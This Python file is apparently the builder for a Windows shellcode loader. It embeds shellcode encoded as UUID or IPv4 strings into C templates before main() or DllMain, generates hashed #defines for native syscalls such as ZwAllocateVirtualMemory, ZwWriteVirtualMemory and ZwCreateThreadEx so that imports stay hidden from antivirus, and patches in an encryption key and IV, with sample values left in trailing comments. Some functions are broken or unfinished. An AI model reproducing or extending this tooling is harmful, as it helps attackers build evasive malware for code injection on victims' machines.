from asyncio.windows_events import NULL
import re
import encrypt
import os

def PatchUuidList(path, list, filetype):
    cUuidStr = "const char* uuids[] ={"
    for UUID in list:
        cUuidStr += "\""+UUID+"\""+","
    cUuidStr += "};\n"
    count = 0
    with open(path, "r", encoding="utf-8") as f:
        lines = f.readlines()
        for line in lines:
            count += 1
            if re.search(r'ipv4\[]', line) or re.search(r'uuids\[]', line):
                return -100                                         # 需要clear
            if filetype == "exe":
                if re.search(r'main()', line):
                    PatchCount = count - 1
            elif filetype == "dll":
                if re.search(r'DllMain', line):
                    PatchCount = count - 1
    lines.insert(PatchCount, cUuidStr)

    with open(path, "w", encoding="utf-8") as f:
        f.writelines(lines) 
    return 1

def PatchIpv4List(path, list, filetype):
    cIpv4Str = "const char* ipv4[] ={"
    for IPV4 in list:
        cIpv4Str += "\""+IPV4+"\""+","
    cIpv4Str += "};\n"
    count = 0
    with open(path,"r",encoding="utf-8") as f:
        lines = f.readlines()
        for line in lines:
            count += 1
            if re.search(r'uuids\[]', line) or re.search(r'ipv4\[]',line):
                return -100                                         # 需要clear
            if filetype == "exe":
                if re.search(r'main()', line):
                    PatchCount = count - 1
            elif filetype == "dll":
                if re.search(r'DllMain', line):
                    PatchCount = count - 1
    lines.insert(PatchCount, cIpv4Str)
    with open(path, "w", encoding="utf-8") as f:
        f.writelines(lines) 
    return 1


def ClearUuidIpv4List(path,filetype):
    NullStr = "\n"
    count = 0
    with open(path, "r", encoding="utf-8") as f:
        lines = f.readlines()
        for line in lines:
            count += 1
            if filetype == "exe":
                if re.search(r'main()', line):
                    PatchCount = count - 1
            elif filetype == "dll":
                if re.search(r'DllMain', line):
                    PatchCount = count - 1

    with open(path, "w", encoding="utf-8") as f:
        count = 0
        for line in lines:
            if(count != PatchCount - 1):
                f.write(lines[count])
            count += 1
    return 1

def PatchFunctionHash(path,funchash):
    distFucHash = {'ntdll.dll':'',
                   'KERNEL32.dll':'',
                   'RtlIpv4StringToAddressA':'',
                   'LdrFastFailInLoaderCallout':'',
                   'RtlLeaveCriticalSection':'',
                   'RtlRandom':'',
                   'LdrGetDllFullName':'',
                   'ZwOpenThread':'',
                   'ZwOpenProcess':'',             
                   'ZwWaitForSingleObject':'',
                   'ZwAllocateVirtualMemory' :'',
                   'ZwWriteVirtualMemory':'',
                   'ZwFreeVirtualMemory':'',
                   'ZwProtectVirtualMemory':'',
                   'ZwReadVirtualMemory':'',
                   'ZwSignalAndWaitForSingleObject':'',
                   'ZwClose':'',
                   'ZwCreateThreadEx':'',
                   'rpcrt4.dll':'',
                   'UuidFromStringA':'',
                   'LdrLoadDll':'',
                   'FreeLibrary':'',
                   'EnumCalendarInfoExA':'',
                   'ConvertThreadToFiber':'',
                   'CreateFiber':'',
                   'SwitchToFiber':'',
                   'FreeConsole':'',
                   'NtCurrentProcess()':'((HANDLE)(LONG_PTR)-1)',
                   'NtCurrentThread()':'( ( HANDLE ) ( LONG_PTR ) - 2 )',
                   'FUNC_HASH':''
      }
    list = ['#include <Windows.h>\n']
    for key in distFucHash.keys():
        if re.search(r'Zw',key):
            distFucHash[key] = encrypt.HashEx(key,len(key),1,funchash)
            line = "#define" + "\t" + "_Sys" + key + "\t" + str(distFucHash[key]) + "\n"
            list.append(line)
        elif re.search(r'Current',key):
            line = "#define" + "\t" + key + "\t" + str(distFucHash[key]) + "\n"
            list.append(line)
        elif re.search(r'ntdll.dll',key):
            distFucHash[key] = encrypt.HashEx(key,len(key),1,funchash)
            line = "#define" + "\t" + "_Ntdll" + "\t" + str(distFucHash[key]) + "\n"
            list.append(line)
        elif re.search(r'rpcrt4.dll',key):
            distFucHash[key] = encrypt.HashEx(key,len(key),1,funchash)
            line = "#define" + "\t" + "_Rpcrt4" + "\t" + str(distFucHash[key]) + "\n"
            list.append(line)
        elif re.search(r'KERNEL32.dll',key):
            distFucHash[key] = encrypt.HashEx(key,len(key),1,funchash)
            line = "#define" + "\t" + "_Kernel32" + "\t"  + str(distFucHash[key]) + "\n"
            list.append(line)
        elif re.search(r'UuidFromStringA',key):
            distFucHash[key] = encrypt.HashEx(key,len(key),1,funchash)
            line = "#define" + "\t" + "_uuidFromStringA" + "\t"  + str(distFucHash[key]) + "\n"
            list.append(line)
        elif re.search(r'FUNC_HASH',key):
            line = "#define" + "\t" + "FUNC_HASH" + "\t"  + str(funchash) + "\n"
            list.append(line)
        else:
            distFucHash[key] = encrypt.HashEx(key,len(key),1,funchash)
            line = "#define" + "\t_" + key + "\t" + str(distFucHash[key]) + "\n"
            list.append(line)
    #if isinstance(exportPath,str):
    #    if not os.path.isfile(exportPath):
    #        print("导出函数文件不存在")
    #    with open(exportPath,"r",encoding="utf-8") as f:
    #        exportlines = f.readlines()
    #        for line in exportlines:
    #            list.append(line)
    with open(path, "w", encoding="utf-8") as f:
        f.writelines(list)
    return 1
   
def PatchKeyAndIv(path, key, iv, exportPath):
    keystr = str(key,encoding="utf-8")
    ivstr = str(iv,encoding="utf-8")
    patchkey = " const CHAR* keys = \"" + keystr +"\";\n"
    patchiv = " const CHAR* iv = \"" + ivstr +"\";"
    count = 0
    with open(path, "r", encoding="utf-8") as f:
         lines = f.readlines()
         for line in lines:
            count += 1
            if re.search(r'keys', line) or re.search(r'iv', line):
                lines[count] = ""                                        # 需要clear
    if isinstance(exportPath,str):
            if not os.path.isfile(exportPath):
                print("导出函数文件不存在")
            with open(exportPath,"r",encoding="utf-8") as f:
                exportlines = f.readlines()
    with open(path, "w", encoding="utf-8") as f:
         lines[count - 2] = patchkey  
         lines[count - 1] = patchiv  
         lines.append("\n")
         if isinstance(exportPath,str):
             for line in exportlines:
                 lines.append(line)
         f.writelines(lines)
         return 1

# 清除导出函数。
def ClearExportFunc(exportPath):
     count = 0
     with open(exportPath, "r", encoding="utf-8") as f:
         lines = f.readlines()
         for line in lines:
             if re.search(r'extern', line):
                 lines[count] = ""
             count += 1
     with open(exportPath, "w", encoding="utf-8") as f:
         f.writelines(lines)
     return 1
         
                 


def PatchExportFunction(targetPath, exportPath):
    if not os.path.isfile(exportPath):
        print("导出函数文件不存在")
    with open(exportPath,"r",encoding="utf-8") as f:
        exportlines = f.readlines()
    count = 0
    with open(targetPath,"r",encoding="utf-8") as f:
        tarlines = f.readline
        for line in tarlines:
            count += 1
            return





  #  const CHAR* keys = "KmILU0ym1lSjF00+zCnAtQfoWuTQrnKD'";
#const CHAR* iv = "//UpTcV+ZMIoAqbx";